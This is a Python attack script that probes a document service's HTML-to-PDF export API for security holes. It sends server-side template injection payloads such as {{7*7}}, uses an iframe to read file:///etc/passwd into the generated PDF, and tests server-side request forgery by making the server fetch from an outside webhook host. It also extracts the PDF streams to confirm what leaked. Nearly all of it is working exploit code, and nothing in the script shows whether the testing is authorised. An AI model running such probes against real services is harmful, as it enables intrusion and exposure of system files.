import json,subprocess,os,re,zlib,uuid
H=os.environ['H']; T=os.environ['T']; BB=os.environ['BB']; WH=os.environ['WH']
def req(path,body):
    cmd=['curl','-s','-m','90','-o','/tmp/b','-w','%{http_code}','-X','POST',H+path,
         '-H','token: '+T,'-H',BB,'-H','Content-Type: application/json','-d',json.dumps(body)]
    return subprocess.run(cmd,capture_output=True,text=True).stdout.strip(), open('/tmp/b',encoding='utf-8',errors='replace').read()
def gen(html,name):
    c,b=req('/api/v1/document_intelligence/export/pdf',{"htmlContent":html,"fileName":name})
    if c!='200': return c,None,b
    try: return c,json.loads(b).get('url'),b
    except: return c,None,b
def pdftext(url):
    p='/tmp/v.pdf'
    subprocess.run(['curl','-s','-m','60','-o',p,url])
    d=open(p,'rb').read()
    out=[]
    for m in re.finditer(rb'stream\r?\n(.*?)endstream',d,re.S):
        try: out.append(zlib.decompress(m.group(1)).decode('latin-1'))
        except: pass
    return d,'\n'.join(out)
tag='zx'+uuid.uuid4().hex[:8]
print("=== SSTI check: does {{7*7}} render as 49? ===")
for payload,expect in [('{{7*7}}','49'),('<%= 7*7 %>','49'),('#{7*7}','49'),('%{7*7}','49')]:
    c,url,b=gen(f"<p>MARK-{payload}</p>",f"zx-{tag}")
    if not url: print(f"  {payload:14} gen={c} {b[:80]}"); continue
    d,t=pdftext(url)
    # look for glyph runs; check raw hex + decoded text presence
    has_literal = payload.replace('{','').replace('}','').replace('%','').replace('<','').replace('>','').replace('=','') in t
    print(f"  {payload:14} pdf={len(d)}B  contains '49'={('49' in t)}  Tj={t.count('Tj')}")
print("\n=== LFI check: does file:///etc/passwd land in PDF? ===")
c,url,b=gen('<h1>ZXLFI</h1><iframe src="file:///etc/passwd" width="900" height="700"></iframe>',f"zx-{tag}-lfi")
if url:
    d,t=pdftext(url)
    print(f"  pdf={len(d)}B  'root:' in pdf={('root:' in t)}  'daemon' in pdf={('daemon' in t)}  Tj={t.count('Tj')}")
    print("  content snippet:",t[:200].replace(chr(10),' '))
print("\n=== SSRF check ===")
c,url,b=gen(f'<img src="{WH}/{tag}-di.png"><iframe src="{WH}/{tag}-dif"></iframe>',f"zx-{tag}-ssrf")
print(f"  gen={c} url={'yes' if url else 'no'}")
open('/tmp/tag182','w').write(tag)
